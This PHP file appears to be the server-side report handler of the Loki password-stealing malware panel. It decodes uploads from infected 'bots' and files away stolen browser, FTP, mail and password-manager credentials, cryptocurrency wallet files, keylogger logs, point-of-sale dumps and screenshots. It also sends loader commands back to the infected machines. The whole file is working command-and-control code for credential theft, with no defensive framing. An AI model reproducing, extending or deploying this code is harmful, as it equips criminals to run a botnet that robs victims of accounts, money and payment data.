<?php
	if(!defined('IN_LOKI')) die("File not found.");

	function __autoload($Class)
	{
		$File = INCLUDE_ . "/class/pass_module/" . $Class . ".php";
		if (file_exists($File))
			include_once($File);
	}

	$DBCall = array 
	(
				   0  => array("NEXISTS_MODULE", 		"Unknown Client"),
				   1  => array("Module_firefox", 		"Mozilla Firefox", 		"15.04.2016."),
				   2  => array("Module_firefox", 		"K-Meleon", 			"15.04.2016."),
				   3  => array("Module_firefox", 		"Flock",				"15.04.2016."),
				   4  => array("Module_firefox", 		"Comodo IceDragon", 	"15.04.2016."),
				   5  => array("Module_firefox", 		"SeaMonkey", 			"15.04.2016."),
				   6  => array("Module_opera", 			"Opera (OLD)"),
				   7  => array("Module_firefox", 		"Apple Safari", 		"15.04.2016."),
				   8  => array("Module_firefox", 		"Internet Explorer", 	"15.04.2016."),
				   9  => array("Module_firefox", 		"Opera (NEW)", 			"15.04.2016."),
				  10  => array("Module_firefox", 		"Comodo Dragon", 		"15.04.2016."),
				  11  => array("Module_firefox", 		"CoolNovo", 			"15.04.2016."),
				  12  => array("Module_firefox", 		"Google Chrome", 		"15.04.2016."),
				  13  => array("Module_firefox", 		"Rambler Nichrome", 	"15.04.2016."),
				  14  => array("Module_firefox", 		"RockMelt", 			"15.04.2016."),
				  15  => array("Module_firefox", 		"Baidu Spark", 			"15.04.2016."),
				  16  => array("Module_firefox", 		"Chromium", 			"15.04.2016."),
				  17  => array("Module_firefox", 		"Titan Browser", 		"15.04.2016."),
				  18  => array("Module_firefox", 		"Torch Browser", 		"15.04.2016."),
				  19  => array("Module_firefox", 		"Yandex.Browser", 		"15.04.2016."),
				  20  => array("Module_firefox", 		"Epic Privacy", 		"15.04.2016."),
				  21  => array("Module_firefox", 		"CocCoc Browser", 		"15.04.2016."),
				  22  => array("Module_firefox", 		"Vivaldi", 				"15.04.2016."),
				  23  => array("Module_firefox", 		"Chromodo", 			"15.04.2016."),
				  24  => array("Module_firefox", 		"Superbird", 			"15.04.2016."),
				  25  => array("Module_firefox", 		"Coowon", 				"15.04.2016."),
				  26  => array("Module_twcommander",	"Total Commander"),
				  27  => array("Module_flashfxp", 		"FlashFXP"),
				  28  => array("Module_filezilla", 		"FileZilla"),
				  29  => array("Module_putty", 			"PuTTY/KiTTY"),
				  30  => array("Module_far", 			"FAR Manager"),
				  31  => array("Module_superputty", 	"SuperPutty"),
				  32  => array("Module_cyberduck", 		"CyberDuck"),
				  33  => array("Module_thunderbird", 	"Mozilla Thunderbird"),
				  34  => array("Module_pidgin", 		"Pidgin"),
				  35  => array("Module_bitvise", 		"Bitvise"),
				  36  => array("Module_novaftp", 		"NovaFTP"),
				  37  => array("Module_netdrive", 		"NetDrive"),
				  38  => array("Module_nppftp", 		"NppFTP"),
				  39  => array("Module_ftpshell", 		"FTPShell"),
				  40  => array("Module_sherrodftp", 	"sherrodFTP"),
				  41  => array("Module_myftp", 			"MyFTP"),
				  42  => array("Module_ftpbox", 		"FTPBox"),
				  43  => array("Module_ftpinfo", 		"FtpInfo"),
				  44  => array("Module_linesftp", 		"Lines FTP"),
				  45  => array("Module_fullsync", 		"FullSync"),
				  46  => array("Module_nexusfile", 		"Nexus File"),
				  47  => array("Module_fjsftp", 		"JaSFtp"),
				  48  => array("Module_ftpnow", 		"FTP Now"),
				  49  => array("Module_xftp", 			"Xftp"),
				  50  => array("Module_easyftp", 		"Easy FTP"),
				  51  => array("Module_goftp", 			"GoFTP"),
				  52  => array("Module_netfile", 		"NETFile"),
				  53  => array("Module_blazeftp", 		"Blaze Ftp"),
				  54  => array("Module_staffftp", 		"Staff-FTP"),
				  55  => array("Module_ftpnow", 		"DeluxeFTP"),
				  56  => array("Module_alftp", 			"ALFTP"),
				  57  => array("Module_ftpgetter", 		"FTPGetter"),
				  58  => array("Module_ws_ftp", 		"WS_FTP"),
				  59  => array("Module_fulltiltpoker", 	"Full Tilt Poker"),
				  60  => array("Module_pokerstars", 	"PokerStars"),
				  61  => array("Module_fjsftp", 		"AbleFTP"),
				  62  => array("Module_fjsftp", 		"Automize"),
				  63  => array("Module_sftpnetdrive", 	"SFTP Net Drive"),
				  64  => array("Module_anyclient", 		"Anyclient"),
				  65  => array("Module_expandrive", 	"ExpanDrive"),
				  66  => array("Module_steed", 			"Steed"),
				  67  => array("Module_vnc", 			"RealVNC/TightVNC"),
				  68  => array("Module_bitvise", 		"mSecure Wallet"),
				  69  => array("Module_syncovery", 		"Syncovery"),
				  70  => array("Module_smartftp", 		"SmartFTP"),
				  71  => array("Module_freshftp", 		"FreshFTP"),
				  72  => array("Module_bitkinex", 		"BitKinex"),
				  73  => array("Module_ultrafxp", 		"UltraFXP"),
				  74  => array("Module_ultrafxp", 		"FTP Rush"),
				  75  => array("Module_securefx", 		"Vandyk SecureFX"),
				  76  => array("Module_odin", 			"Odin Secure FTP Expert"),
				  77  => array("Module_fling", 			"Fling"),
				  78  => array("Module_fling", 			"ClassicFTP"),
				  79  => array("Module_firefox", 		"NETGATE BlackHawk"),
				  80  => array("Module_firefox", 		"Lunascape"),
				  81  => array("Module_firefox", 		"QTWeb Browser"),
				  82  => array("Module_qupzilla", 		"QupZilla"),
				  //83  => array("Module_firefox", 	"Maxthon"), rp163
				  84  => array("Module_foxmail", 		"Foxmail"),
				  85  => array("Module_pocomail", 		"Pocomail"),
				  86  => array("Module_incredimail", 	"IncrediMail"),
				  87  => array("Module_winscp", 		"WinSCP"),
				  88  => array("Module_gmailnp", 		"Gmail Notifier Pro"),
				  89  => array("Module_checkmail", 		"CheckMail"),
				  90  => array("Module_mailer", 		"SNetz Mailer"),
				  91  => array("Module_operamail", 		"Opera Mail"),
				  92  => array("Module_thunderbird", 	"Postbox"),
				  93  => array("Module_firefox", 		"Cyberfox", 				"45.0.3, X64 - 15.04.2016."),
				  94  => array("Module_firefox", 		"Pale Moon"),
				  95  => array("Module_thunderbird", 	"FossaMail"),
				  96  => array("Module_becky", 			"Becky!"),
				  97  => array("Module_mailspeaker", 	"MailSpeaker"),
				  98  => array("Module_outlook", 		"Outlook"),
				  99  => array("Module_ymail", 			"yMail"),
				  100  => array("Module_trojita", 		"Trojita"),
				  101  => array("Module_trulymail", 	"TrulyMail"),
				  
				  102  => array("Module_stickypad", 	"StickyPad"),
				  103  => array("Module_tododesklist", 	"To-Do Desklist"),
				  104  => array("Module_stickies", 		"Stickies"),
				  105  => array("Module_notefly", 		"NoteFly"),
				  106  => array("Module_notezilla", 	"NoteZilla"),
				  107  => array("Module_stickynotes", 	"Sticky Notes"),
				  
				  108  => array("Module_winftp", 		"WinFtp"),
				  109  => array("Module_32bit", 		"32BitFTP"),
				  
				  110  => array("Module_firefox", 		"Mustang Browser"),
				  111  => array("Module_firefox", 		"360 Browser"),
				  112  => array("Module_firefox", 		"Citrio Browser"),
				  113  => array("Module_firefox", 		"Chrome SxS"),
				  114  => array("Module_firefox", 		"Orbitum", 					"43.0 - 15.04.2016."),
				  115  => array("Module_firefox", 		"Sleipnir"),
				  116  => array("Module_firefox", 		"Iridium", 					"48.2 - 15.04.2016."),
				  117  => array("Module_firefox", 		"117"),
				  118  => array("Module_firefox", 		"118"),
				  119  => array("Module_firefox", 		"119"),
				  120  => array("Module_firefox", 		"120"), // 110-120 Chrome 2
				  
				  121  => array("Module_cred", 			"Windows Credentials"),
				  122  => array("Module_ftpnavigator", 	"FTP Navigator"),
				  123  => array("Module_winkey", 		"Windows Key"),
				  
				  124  => array("Module_keepass", 		"KeePass"),
				  125  => array("Module_npass", 		"EnPass"),
				  126  => array("Module_firefox", 		"Waterfox"),
				  127  => array("Module_folder", 		"AI RoboForm"),
				  128  => array("Module_folder", 		"1Password"),
				  129  => array("Module_winbox", 		"Mikrotik WinBox"),
				  
				  200  => array("NEXISTS_MODULE", 		"File Grabber"),
				  201  => array("NEXISTS_MODULE", 		"POS Grabber"),
				  202  => array("NEXISTS_MODULE", 		"Keylogger"),
				  203  => array("NEXISTS_MODULE", 		"Screenshot")
		);

	$DBWalletCall = array ( "Bitcoin", "MultiBit", "Electrum-BTC", "Armory", "Litecoin", "Namecoin", "Ufasoft", "PPCoin", "Blockchain", "Ixcoin", "Feathercoin", "NovaCoin", "Primecoin", "Terracoin", "Devcoin", "Digital", "Anoncoin", "Worldcoin", "Quarkcoin", "Infinitecoin", "DogeCoin", "AsicCoin", "LottoCoin", "DarkCoin", "Electrum-LTC", "BitShares", "MultiDoge", "Monacoin", "BitcoinDark", "Unobtanium", "Paycoin", "Dashcoin (DarkCoin)", "mSIGNA", "MultiBitHD", "Copay");
	
	
	set_error_handler('ErrorHandler2', E_ALL);
	$LokiDBCon = NULL;
	
	function ErrorHandler2( $errno, $errstr, $errfile, $errline, $errcontext)
	{
		$ErrorType = $errno;
		switch($errno)
		{
			case E_ERROR:               $ErrorType = "E_ERROR"; break;
			case E_WARNING:             $ErrorType = "E_WARNING"; break;
			case E_PARSE:               $ErrorType = "E_PARSE"; break;
			case E_NOTICE:              $ErrorType = "E_NOTICE"; return;
			case E_CORE_ERROR:          $ErrorType = "E_CORE_ERROR"; break;
			case E_CORE_WARNING:        $ErrorType = "E_CORE_WARNING"; break;
			case E_COMPILE_ERROR:       $ErrorType = "E_COMPILE_ERROR"; break;
			case E_COMPILE_WARNING:     $ErrorType = "E_COMPILE_WARNING"; break;
			case E_USER_ERROR:          $ErrorType = "E_USER_ERROR"; break;
			case E_USER_WARNING:        $ErrorType = "E_USER_WARNING"; break;
			case E_USER_NOTICE:         $ErrorType = "E_USER_NOTICE"; break;
			case E_STRICT:              $ErrorType = "E_STRICT"; break;
			case E_RECOVERABLE_ERROR:   $ErrorType = "E_RECOVERABLE_ERROR"; break;
			case E_DEPRECATED:          $ErrorType = "E_DEPRECATED"; break;
			case E_USER_DEPRECATED:     $ErrorType = "E_USER_DEPRECATED"; break;
		}

		$Error_ = print_r($errstr, true) . " (".$ErrorType.")" . "   ". print_r($errfile, true) . " (".print_r($errline, true) . " line)";
		
		global $LokiDBCon;
		
		if($LokiDBCon != NULL)
			$LokiDBCon->InsertData($Error_, "error", time(), -1, 0, 0, FALSE);
	}
	
	class Report
	{
		private $DBLink;
		private $ReportID;
		private $Stream;
		protected $Options;
		private $Key;
		private $TMP_;
		
		function __construct($MySQL, $Stream, $Lenght, $Key = NULL, $TMP_ = NULL)
		{
			$this->DBLink = new LokiDB($MySQL['hostname'], $MySQL['username'], $MySQL['password'], $MySQL['database'], $MySQL['port'],  $MySQL['prefix'], FALSE, TRUE);
			global $LokiDBCon;
			$LokiDBCon = $this->DBLink;
			
			$this->Key = $Key;
			$this->TMP_ = $TMP_;
			
			$this->Options = array();
			$Result = $this->ParseHeader($Stream, $Lenght);
			if(!$Result)
				return NULL;
			
			$this->ProcessStream($Result);
		}
		
		function __destruct()
		{
			$this->DBLink->Close();
			global $LokiDBCon;
			$LokiDBCon = NULL;
		}

		protected function ParseHeader($lpBuffer, $dwLength)
		{
			$ReportStream = new Stream($lpBuffer, $dwLength);
			$Header["VERSION"]	= $ReportStream->GetWORD();
			$Header["TYPE"]		= $ReportStream->GetWORD();
			
			if($Header["TYPE"] == 39)
			{
				$Header["BIN_ID"]	= $ReportStream->getSTRING_();
				if($Header["VERSION"] > 13)
				{
					$User = $ReportStream->getSTRING_();
					$PC	  = $ReportStream->getSTRING_();
					$Domain = $ReportStream->getSTRING_();
					
					if($PC != $Domain)
						$Header["BOT_NAME"] = $PC . "." . $Domain . "\\" . $User;
					else
						$Header["BOT_NAME"] = $PC . ".\\" . $User;
				}
				else
					$Header["BOT_NAME"] = "OLD_V";

				$Header["SCREEN_SIZE"]	=  $ReportStream->GetDWORD() . "x" . $ReportStream->GetDWORD();
				$Header["TYPE"] = 0;
				
				$Header["ACCOUNT"]  	= GetAccountType($ReportStream->GetWORD(), $ReportStream->GetWORD());
				$Header["BIT"] 			= $ReportStream->GetWORD();
				
				if($Header["VERSION"] > 14) //Cred
					$Header["OS"] 		= GetOSType_($ReportStream->GetWORD(), $ReportStream->GetWORD(), $ReportStream->GetWORD(), $ReportStream->GetWORD());
				else
					$Header["OS"] 		= GetOSType($ReportStream->GetWORD(), $ReportStream->GetWORD());

				if($Header["VERSION"] > 11) //Cred
					$Header["REPORTED"] = $ReportStream->GetWORD();
				else
					$Header["REPORTED"]	= FALSE;
				
				$Header["COMPRESSED"] 	= $ReportStream->GetWORD();
				$Header["COMPTYPE"] 	= $ReportStream->GetWORD();
				
				$Header["ENCODED"] 		= $ReportStream->GetWORD();
				$Header["ENCTYPE"] 		= $ReportStream->GetWORD();
				
				$Header["ORI_DATA_LEN"] = $ReportStream->GetDWORD();
				$Header["GUID"] 		= $ReportStream->getSTRING_();
				
				$Header["KEY"] 			= $ReportStream->getBINARY_();
				$Header["DATA"] 		= $ReportStream->getBINARY_();
				
				if($Header["COMPRESSED"])
				{
					$Header["DATA"] 	= UnPackStream($Header["DATA"], $Header["ORI_DATA_LEN"]);
					$Header["DATA_LEN"] = $Header["ORI_DATA_LEN"];
				}
				else
					$Header["DATA_LEN"] = $Header["ORI_DATA_LEN"];
			}
			else if(
				(MODULE_WALLET && $Header["TYPE"] == 38) || 
				(MODULE_FILE_GRABBER && $Header["TYPE"] == 41) || 
				(MODULE_POS_GRABBER && $Header["TYPE"] == 42) || 
				(MODULE_KEYLOGGER && $Header["TYPE"] == 43) || 
				(MODULE_SCREENSHOT && $Header["TYPE"] == 44)
			)
			{
				if($Header["TYPE"] == 38)
					$Header["TYPE"] = 1;
				else if($Header["TYPE"] == 41)
					$Header["TYPE"] = 3;
				else if($Header["TYPE"] == 42)
					$Header["TYPE"] = 4;
				else if($Header["TYPE"] == 43)
					$Header["TYPE"] = 5;
				else if($Header["TYPE"] == 44)
					$Header["TYPE"] = 6;
				
				$Header["COMPRESSED"] 	= $ReportStream->GetWORD();
				$Header["COMPTYPE"] 	= $ReportStream->GetWORD();
				
				$Header["ENCODED"] 		= $ReportStream->GetWORD();
				$Header["ENCTYPE"] 		= $ReportStream->GetWORD();
				$Header["ORI_DATA_LEN"] = $ReportStream->GetDWORD();
				
				$Header["GUID"] 		= $ReportStream->getSTRING_();
				$Header["KEY"] 			= $ReportStream->getBINARY_();
				
				$Header["DATA"] 		= $ReportStream->getBINARY_();

				if($Header["COMPRESSED"])
				{
					$Header["DATA"] 	= UnPackStream($Header["DATA"], $Header["ORI_DATA_LEN"]);
					$Header["DATA_LEN"] = $Header["ORI_DATA_LEN"];
				}
				else
					$Header["DATA_LEN"] = $Header["ORI_DATA_LEN"];
			}
			else if(MODULE_LOADER && $Header["TYPE"] == 40)
			{
				$Header["BIN_ID"]	= $ReportStream->getSTRING_();
				if($Header["VERSION"] > 13)
				{
					$User = $ReportStream->getSTRING_();
					$PC	  = $ReportStream->getSTRING_();
					$Domain = $ReportStream->getSTRING_();
					
					if($PC != $Domain)
						$Header["BOT_NAME"] = $PC . "." . $Domain . "\\" . $User;
					else
						$Header["BOT_NAME"] = $PC . ".\\" . $User;
				}
				else
					$Header["BOT_NAME"] = "OLD_V";
				
				if($Header["VERSION"] > 9)
				{
					$X_ = $ReportStream->GetDWORD();
					$Y_ = $ReportStream->GetDWORD();
					$Header["SCREEN_SIZE"]	=  $X_ . "x" . $Y_;
				}
				else
					$Header["SCREEN_SIZE"]	= "0x0";				
				
				$Header["TYPE"] = 2;
				
				$Header["ACCOUNT"]  	= GetAccountType($ReportStream->GetWORD(), $ReportStream->GetWORD());
				$Header["BIT"] 			= $ReportStream->GetWORD();
				
				if($Header["VERSION"] > 14) //Cred
					$Header["OS"] 		= GetOSType_($ReportStream->GetWORD(), $ReportStream->GetWORD(), $ReportStream->GetWORD(), $ReportStream->GetWORD());
				else
					$Header["OS"] 		= GetOSType($ReportStream->GetWORD(), $ReportStream->GetWORD());
				
				$Header["GUID"] 		= $ReportStream->getSTRING_();
			}
			else
				$Header = NULL;
			
			$ReportStream = NULL;
			return $Header;
		}

		protected function GetItem()
		{
			$Module  = $this->Stream->getDWORD();
			$Version = $this->Stream->getDWORD();

			$Data = $this->Stream->getBINARY_();
			if($Data === NULL)
				return NULL;

			return array("Modul" => $Module, "Version" => $Version, "Data" => $Data);
		}

		protected function ProcessStream($Result)
		{
			if(!isset($Result['TYPE']))
				return;
			
			if($Result['TYPE'] == 0)
			{
				if(MODULE_LOADER)
					$ID__ = $this->DBLink->InsertBots(time(), GetClientIP(), GetCountryCode(), $Result["OS"], $Result["BIT"], $Result["ACCOUNT"], $Result["GUID"], $Result["VERSION"], $Result["BIN_ID"], $Result["SCREEN_SIZE"], $Result["BOT_NAME"]);
				
				$this->ReportID = NULL;
				
				if($Result['REPORTED'])
				{
					$Data = $this->DBLink->GetReport(0, 1, 'all', 0, $Result['GUID']);
					if(isset($Data[0]['report_id']))
					{
						$this->ReportID = $Data[0]['report_id'];
						$Data = NULL;
					}
					else
					{
						if(!$this->ReportID = $this->DBLink->InsertReport(time(), GetClientIP(), GetCountryCode(), $Result["OS"], $Result["BIT"], $Result["ACCOUNT"], $Result["GUID"], $Result["VERSION"], GetSaltedHash($Result["DATA"]), $Result["DATA"], $Result["BIN_ID"], $Result["SCREEN_SIZE"], $Result["BOT_NAME"]))
							return FALSE;		
						if(MODULE_LOADER)
						{
							$this->DBLink->AddReportToBot($Result["GUID"]);
						}
					}
				}
				else
				{
					if(!$this->ReportID = $this->DBLink->InsertReport(time(), GetClientIP(), GetCountryCode(), $Result["OS"], $Result["BIT"], $Result["ACCOUNT"], $Result["GUID"], $Result["VERSION"], GetSaltedHash($Result["DATA"]), $Result["DATA"], $Result["BIN_ID"], $Result["SCREEN_SIZE"], $Result["BOT_NAME"]))
						return FALSE;	
					
					if(MODULE_LOADER)
					{
						$this->DBLink->AddReportToBot($Result["GUID"]);
					}
				}
				
				global $DBCall;
				$this->Stream = new Stream($Result["DATA"], $Result["DATA_LEN"]);
				if($this->Stream)
				{
					$Item = $this->GetItem();
					while($Item != NULL)
					{
 						if(isset($DBCall[$Item["Modul"]]) && class_exists($DBCall[$Item["Modul"]][0]) && isset($Item["Data"]) && strlen($Item["Data"]))
						{
							$Modul = new $DBCall[$Item["Modul"]][0]($Item["Data"], $Item["Version"], $this->Options);

							if ($Modul)
							{
								foreach ($Modul->FTP_ as $Element)
									$this->DBLink->InsertData($Element, "ftp", time(), $this->ReportID, $Item["Modul"], GetSaltedHash($Element));
									
								foreach ($Modul->HTTP_ as $Element)
									$this->DBLink->InsertData($Element, "http", time(), $this->ReportID, $Item["Modul"], GetSaltedHash($Element));
									
								foreach ($Modul->DOWNLOADS_ as $Element)
								{
									$Name = substr(md5($Element[1]), 0, 10) . "_" . $Element[0];
									if($this->DBLink->InsertData($Name, "datadl", time(), $this->ReportID, $Item["Modul"], GetSaltedHash($Element[1])))
									{
										file_put_contents($this->TMP_ . '/' . $Name, EncryptWallet($Element[1], $this->Key));
									}				
										
								}
								
								foreach ($Modul->OTHER_ as $Element)
									$this->DBLink->InsertData($Element, "data", time(), $this->ReportID, $Item["Modul"], GetSaltedHash($Element));
									
								foreach ($Modul->MAIL_ as $Element)
									$this->DBLink->InsertData($Element, "mail", time(), $this->ReportID, $Item["Modul"], GetSaltedHash($Element));
									
								$this->Options = $Modul->Options;
							}
							
							$Modul = NULL;
						}
						$Item = $this->GetItem();
					}
					
					$this->DBLink->FixReportNums($this->ReportID);
					
					$this->Stream = NULL;
				}
				
				$this->DBLink->UpdateReportData($this->ReportID);
			}
			else if(MODULE_WALLET && $Result['TYPE'] == 1)
			{
				$Data = $this->DBLink->GetReport(0, 1, 'all', 0, $Result['GUID']);
				if(isset($Data[0]))
				{
					$Modul = new Module_wallet($Result, 0, $this->Options);
					if ($Modul)
					{
						foreach ($Modul->DOWNLOADS_ as $Element)
						{
							$Name = $Element[0];
							$Exploded = explode('_', $Name);
							$WID_ = $this->DBLink->InsertWallet($Name, time(), $Data[0]['report_id'], $Exploded[1], GetSaltedHash($Element[1]), strlen($Element[1]));
							if($WID_ != FALSE)
							{
								file_put_contents($this->TMP_ . '/' . $Name, EncryptWallet($Element[1], $this->Key));

								if($Exploded[1] == 24 || $Exploded[1] == 2) //Electrum
								{
									$Encrypted = $Transaction = NULL;

									$Electrum = json_decode($Element[1], TRUE);
									if($Electrum != NULL && isset($Electrum['accounts']))
									{
										if(isset($Electrum['use_encryption'])) $Encrypted = $Electrum['use_encryption'];
										if(isset($Electrum['transactions'])) $Transaction = TRUE;
									}

									$this->DBLink->UpdateWallet("0.00", $Encrypted, $Transaction, NULL, $WID_, NULL);
									$Electrum = NULL;
								}
								
							}
						}
						$this->Options = $Modul->Options;
					}

					$this->DBLink->FixReportNums($Data[0]['report_id']);
					$Modul = NULL;
				}
			}
			else if(MODULE_LOADER && $Result['TYPE'] == 2)
			{
				$ID__ = $this->DBLink->InsertBots(time(), GetClientIP(), GetCountryCode(), $Result["OS"], $Result["BIT"], $Result["ACCOUNT"], $Result["GUID"], $Result["VERSION"], $Result["BIN_ID"], $Result["SCREEN_SIZE"], $Result["BOT_NAME"]);
				$DataNum = 0;
				
				$Stream__ = new PHPStream;
				$Commands = $this->DBLink->GetCommandsBots($ID__);
				
				if($Commands != NULL && sizeof($Commands > 0))
				{
					foreach($Commands as $Element)
					{
						$DataNum++;
						$Stream__->AddDWORD2Stream($Element['command_id']);
						$Stream__->AddDWORD2Stream($Element['command_type']);
						$Stream__->AddDWORD2Stream($Element['command_time_limit']);
						$Stream__->AddString2Stream($Element['command_data']);
					}
				}
				
				$Stream__->AddDWORD2Stream($DataNum, TRUE);
				$Stream__->AddDWORD2Stream($Stream__->GetLen() + 4, TRUE);
				
				echo $Stream__->GetData();
				$Stream__ = NULL;
			}
			else if((MODULE_FILE_GRABBER && $Result['TYPE'] == 3) || (MODULE_KEYLOGGER && $Result['TYPE'] == 5))
			{
				$Data = $this->DBLink->GetReport(0, 1, 'all', 0, $Result['GUID']);
				if(isset($Data[0]))
				{
					$Stream__ = new Stream($Result['DATA'], $Result['ORI_DATA_LEN']);
					while(TRUE)
					{
						$Name	= $Stream__->getSTRING_();
						if($Name == NULL)
							break;
						
						$ID__ = $Buffer = 0;
						
						if($Result['TYPE'] == 3)
						{
							$ID__ = 200;
							$Buffer = $Stream__->getBINARY_();
						}
						
						if($Result['TYPE'] == 5)
						{
							$ID__ = 202;
							$Buffer = $Stream__->getSTRING_();
						}
						
						$Name = substr(md5($Buffer), 0, 10) . "_" . $Name;
						if($this->DBLink->InsertData($Name, "datadl", time(), $Data[0]['report_id'], $ID__, GetSaltedHash($Buffer)))					
							file_put_contents($this->TMP_ . '/' . $Name, EncryptWallet($Buffer, $this->Key));
					}
					$Stream__  = NULL;
					$this->DBLink->FixReportNums($Data[0]['report_id']);
				}
			}
			else if(MODULE_POS_GRABBER && $Result['TYPE'] == 4)
			{
				$Data = $this->DBLink->GetReport(0, 1, 'all', 0, $Result['GUID']);
				if(isset($Data[0]))
				{
					$Stream__ = new Stream($Result['DATA'], $Result['ORI_DATA_LEN']);
					while(TRUE)
					{
						$Bin	= $Stream__->getSTRING_();
						if($Bin == NULL)
							break;
						
						$Type	 = $Stream__->getDWORD();
						$Process = $Stream__->getSTRING_();
						
						$Dump = $Bin . "|" . $Type . "|" . $Process . "|" . $Data[0]['report_ip'];
						
						$this->DBLink->InsertData($Dump, "dump", time(), $Data[0]['report_id'], 201, GetSaltedHash($Bin));
					}
					$Stream__  = NULL;
					
					$this->DBLink->FixReportNums($Data[0]['report_id']);
				}
			}
			else if(MODULE_SCREENSHOT && $Result['TYPE'] == 6)
			{
				$Stream__ = new Stream($Result['DATA'], $Result['ORI_DATA_LEN']);
				while(TRUE)
				{
					$bData	= $Stream__->getBINARY_();
					if($bData == NULL)
						break;
						
					$Name = $Result['GUID'] . "_screen.png";
					if(file_exists($this->TMP_ . '/' . $Name))
						unlink($this->TMP_ . '/' . $Name);
						
					file_put_contents($this->TMP_ . '/' . $Name, $bData);
				}
				$Stream__  = NULL;
			}
		}
	}
	
	class PHPStream
	{
		private $DataLen;
		private $Data;
		
		function __construct()
		{
			$this->DataLen 	= 0;
			$this->Data 	= '';
		}
		
		function __destruct()
		{
		
		}
		
		function AddDWORD2Stream($Integer, $Before = FALSE)
		{
			$this->DataLen 	+= 4;
			
			if($Before)
				$this->Data = pack("L", $Integer) . $this->Data;
			else
				$this->Data = $this->Data . pack("L", $Integer);
		}
		
		function AddString2Stream($String, $Before = FALSE)
		{
			$this->DataLen 	+= strlen($String);
			
			$this->AddDWORD2Stream(strlen($String));
			$this->Data = $this->Data . $String;
		}
		
		function GetData()
		{
			return $this->Data;
		}
		
		function GetLen()
		{
			return $this->DataLen;
		}
	}
	
	class Stream
	{
		private $DataPos;
		private $DataLen;
		private $Data;
		
		function __construct($Source, $SourceLen = NULL)
		{
			$this->DataPos 	= 0;
			$this->Data 	= $Source;
			
			if($SourceLen == NULL || $SourceLen < 1)
				$this->DataLen 	= strlen($Source);
			else
				$this->DataLen 	= $SourceLen;
		}
		
		function __destruct()
		{
		
		}
		
		public function GetData()
		{
			return $this->Data;
		}
		
		public function GetDataPos()
		{
			return $this->DataPos;
		}
		
		public function GetDataLen()
		{
			return $this->DataLen;
		}
		
		public function Skip($Lenght)
		{
			if ($this->DataPos + $Lenght > $this->DataLen)
				return FALSE;

			$this->DataPos += $Lenght;
			return TRUE;
		}	
		
		public function getDWORD($Big = TRUE)
		{
			if ($this->DataPos + 4 > $this->DataLen)
				return FALSE;

			$CP_ = $this->DataPos;
			$this->DataPos += 4;
			
			if(!$Big)
				return LittleInt32(substr($this->Data, $CP_, 4));
			
			return BigInt32(substr($this->Data, $CP_, 4));
		}
		public function getWORD()
		{
			if (($this->DataPos + 2) > $this->DataLen)
				return FALSE;

			$CP_ = $this->DataPos;
			$this->DataPos += 2;
			return (int)((int)ord($this->Data[$CP_+1]) << 8 | (int)ord($this->Data[$CP_]));
		}
		
		public function FindBytes($Needle, $Num = 0 /*Before*/)
		{
			$Len = strlen($Needle);
			if (($this->DataPos + $Len) > $this->DataLen)
				return FALSE;
			
			
			$Pos = strpos(substr($this->Data, $this->DataPos), $Needle);
			if($Pos === false)
				return FALSE;
			
			$this->DataPos += $Pos - $Num;
			
			return TRUE;
		}
		
		public function getBYTE()
		{
			if (($this->DataPos + 1) > $this->DataLen)
				return FALSE;
			
			$PTR_ = $this->DataPos;
			$this->DataPos += 1;
			return (int)ord($this->Data[$PTR_]);
		}
		
		public function SetPos($NewPos)
		{
			if(($this->DataPos < $NewPos) && ($NewPos < $this->DataLen))
			{
				$this->DataPos = $NewPos;
			}
		}
		
		public function getC_STR($ReadOnly = FALSE)
		{
			$cLen = 0;
			while(ord($this->Data[$this->DataPos + $cLen]) != '0')
			{
				if($ReadOnly && preg_match('/[\x00-\x1F\x80-\xFF]/', $this->Data[$this->DataPos + $cLen]))
				{
					break;
				}
				
				$cLen++;
				
				if(($this->DataPos + $cLen) == $this->DataLen)
					return '';
			}
			
			if($cLen == 0)
				return '';
			
			$CP_ = $this->DataPos;
			$this->DataPos += $cLen;
			return substr($this->Data, $CP_, $cLen);
		}
		
		public function getSTRING_()
		{
			$Wide 	= $this->GetWORD();
			if($Wide === FALSE)
				return NULL;
			
			$Lenght = $this->GetDWORD();
			if($Lenght === FALSE)
				return NULL;
			
			if (!$Lenght || $Lenght < 0 || ($this->DataPos + $Lenght > $this->DataLen))
				return NULL;

			$CP_ = $this->DataPos;
			$this->DataPos += $Lenght;
			
			$Data_ = substr($this->Data, $CP_, $Lenght);
			
			if($Wide)
			{
				$Data_ = iconv('UTF-16LE', 'UTF-8', $Data_);
			}
			
			return $Data_;
		}
		public function getBINARY_()
		{
			$Lenght = $this->GetDWORD();
			if($Lenght === FALSE)
				return NULL;
			
			if (!$Lenght || $Lenght < 0 || ($this->DataPos + $Lenght > $this->DataLen))
				return '';

			$CP_ = $this->DataPos;
			$this->DataPos += $Lenght;
			
			return substr($this->Data, $CP_, $Lenght);
		}
		public function getSTR($Lenght)
		{
			if (!$Lenght || $Lenght < 0 || ($this->DataPos + $Lenght > $this->DataLen))
				return '';

			$CP_ = $this->DataPos;
			$this->DataPos += $Lenght;
			return substr($this->Data, $CP_, $Lenght);
		}
		
		
		public function getSTRW($Lenght)
		{
			if (!$Lenght || $Lenght < 0 || ($this->DataPos + $Lenght > $this->DataLen))
				return '';

			$CP_ = $this->DataPos;
			$this->DataPos += $Lenght;
			
			$Data_ = substr($this->Data, $CP_, $Lenght);
			return iconv('UTF-16LE', 'UTF-8', $Data_);
		}
	}
	
	abstract class Module_
	{
		public $Options = array();
		
		public $FTP_  = array();
		public $HTTP_ = array();
		public $MAIL_ = array();
		public $OTHER_ = array();
		public $DOWNLOADS_ = array();
		public $WRONG_ = array();
		private $Delemiter 	= "||";

		function __construct($Data, $Version, $Options = '')
		{
			$this->Options = $Options;
			
			$this->process_module($Data, $Version);
		}

		protected function SplitData($Source, $Protocol_ = NULL) //shit
		{
			$Protocol = '';

			if(preg_match('/[a-z]+\:\/\//mi', $Source, $MatchResult))
				$Protocol = $MatchResult[0];
			else
			{
				if($Protocol_ != NULL)
					$Protocol = $Protocol_;
			}

			$Results = explode($this->Delemiter, str_replace($Protocol, "", $Source));
			$Results = array_map('trim', $Results);
			$Results['Count'] 	 = sizeof($Results);

			$Results['Protocol'] = trim($Protocol);

			return $Results;
		}

		protected function append_port($Host, $Port) //OK
		{
			$Host = trim($Host);
			
			if (!nonempty($Port) || !strlen($Host))
				return $Host;

			$Port  = trim(strval($Port));
			$Port_ = strip_quotes($Port);
			if (strlen($Port_) && IsNum($Port_))
				$Port_ = ":" . $Port_;
			else
				$Port_ = "";

			return $Host . $Port_;
		}
		
		protected function ftp_force_ssh($FTP_, $SSH_ = TRUE) //OK
		{
			if (!$SSH_)
